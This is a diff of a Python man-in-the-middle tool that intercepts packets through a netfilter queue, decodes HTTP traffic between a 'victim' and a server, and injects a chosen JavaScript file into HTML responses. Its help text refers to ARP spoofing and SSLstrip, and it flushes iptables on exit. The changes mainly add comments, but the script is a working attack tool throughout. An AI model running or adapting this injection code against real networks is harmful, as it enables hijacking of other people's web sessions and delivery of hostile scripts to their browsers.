@@ -6,22 +6,29 @@ import os
 from termcolor import cprint
 import re
 
+END_TAG = '</body>' #TAG to be replaced in HTML load
+SCRIPT_TAG = '<script>CODE</script>' #TAG to be insert in HTML load
+PORT = 80 #PORT for detection of packets (80 HTTP, 10000 HTTPS with SSLstrip)
 LINE = '____________________________________________________________'
-END_TAG = '</body>'
-SCRIPT_TAG = '<script>CODE</script>'
-PORT = 0
 
-#Process each packet
+
+'''
+Process each packet on Network filter queue
+'''
 def process_packet(packet):
     global PORT
+    
+    #Evaluate IP packet filtered
     IP_pkt = IP(packet.get_payload())
     
+    #If the IP packet has TCP layer and Raw Layer (it can be HTTP packet)
     if IP_pkt.haslayer(Raw) and IP_pkt.haslayer(TCP):
-        #To manage fail of python convertion of some bytes
-        #(No HTML code, so I don't want to analyse this packet)
         try:
+            #Decode load of TCP packet
             load = IP_pkt[Raw].load.decode()
         
+            #IP packet from the victim to the server
+            #destination port = 80 (port of HTTP server)
             if IP_pkt[TCP].dport == PORT:
                 cprint('Request', 'red', attrs=['bold',])
                 
@@ -40,6 +47,8 @@ def process_packet(packet):
 
                 packet.set_payload(bytes(IP_pkt))
 
+            #IP packet from the server to the victim
+            #source port = 80 (port of HTTP server)
             elif IP_pkt[TCP].sport == PORT:
                 cprint('Response', 'blue', attrs=['bold',])
                 load = injection_code(load)
@@ -54,11 +63,16 @@ def process_packet(packet):
                 packet.set_payload(bytes(IP_pkt))
         
         except UnicodeDecodeError:
+            #If python convertion (decode) fails for some bytes
+            #(No HTML code, so I don't want to analyse this packet)
             pass
     
     packet.accept()
 
 
+'''
+Injection of javascript code in HTML load
+'''
 def injection_code(load):
     global END_TAG, SCRIPT_TAG
 
@@ -77,11 +91,16 @@ def injection_code(load):
 
     return load
 
-#Parser of command line argument
+
+'''
+Parser of command line argument
+'''
 def args_parser():
     global SCRIPT_TAG
-
+    
+    #Parser of command line arguments
     parser = argparse.ArgumentParser()
+
     #Initialization of needed arguments
     parser.add_argument("-local", "-l", dest="local", help="If specified, IPTABLES updated to run program on local. Otherwise it works on forward machine (e.g. with arp spoofing).", action='store_true')
     parser.add_argument("-file", "-f", dest="file", help="Name of javascript file to use.")
@@ -103,6 +122,9 @@ def args_parser():
     return args.local, args.https
 
 
+'''
+Main function
+'''
 def main():
     global PORT
     local, https = args_parser()
@@ -122,10 +144,8 @@ def main():
 
     if https:
         PORT = 10000
-    else:
-        PORT = 80
 
-    #O = queue num
+    #queue num = 0
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
 
@@ -138,6 +158,7 @@ def main():
         print('Flushing ip table.', end='\n')
         cprint(f'{LINE}','green', attrs=['bold',], end='\n\n')
         os.system('iptables -F')
+
 
 if __name__=='__main__':
 	main()
